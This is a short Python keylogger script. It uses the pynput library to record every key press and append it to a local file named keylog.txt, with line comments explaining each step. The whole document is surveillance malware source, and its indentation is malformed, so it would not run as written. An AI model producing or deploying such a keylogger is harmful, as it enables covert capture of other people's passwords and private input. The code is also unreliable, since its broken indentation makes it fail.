import pynput.keyboard                   #pynput lib is user for listen the keyboard events

log = " "                                #global variable

def process_key_press(key):               
	global log
	log = log + str(key)                #get values are converted into str
	 with open("keylog.txt", "a") as file:    # Open a file called keylog.txt in append mode
        file.write(str(key) + "\n")       # Write the key and a newline to the file
	
	
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)           #t listens for keypress events.
with keyboard_listener:                # It makes sure the listener runs in a context where it can capture key presses.
	keyboard_listener.join()           #This makes the listener continue running and listening for key presses indefinitely until the program is stopped.
